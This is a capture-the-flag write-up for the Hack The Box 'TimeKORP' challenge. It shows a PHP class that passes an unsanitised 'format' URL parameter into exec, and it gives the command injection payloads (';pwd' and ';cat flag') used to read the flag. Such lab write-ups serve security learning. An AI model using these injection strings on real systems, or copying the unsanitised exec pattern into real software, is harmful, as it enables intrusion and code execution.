## TimeKORP

### Preparation
* Spawn the docker image
* Download and extract the files. Password is `hackthebox`

### Analysis
* There's a flag file with text `HTB{f4k3_fl4g_f0r_t35t1ng}` but that's not the real flag.
* Upon clicking "What's the Date", we discover the "format" parameter in the URL.
<img width="709" alt="image" src="https://github.com/user-attachments/assets/1af2520b-16f2-4e1d-ac8c-df420342b9fe">

* Following up the usage of `format` parameter, we land at
  
```
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```
* It simply constructs a `command` and invokes `exec` function. It doesn't try to sanitise the input. This means we can try executing any command line script.
* Let's try a `pwd` - URL/?format=%27;%20pwd%27
<img width="709" alt="image" src="https://github.com/user-attachments/assets/11bc3c9a-ce9a-4080-b4d3-b322b141d5f4">

* From the `Dockerfile` we see that the flag file is at the root.
```
# Copy flag
COPY flag /flag
```
* Executing URL/?format=%27;%20cat%20flag%27 prints the flag.
<img width="671" alt="image" src="https://github.com/user-attachments/assets/248637a1-6b05-48a2-b0c6-d65fac7cf09a">


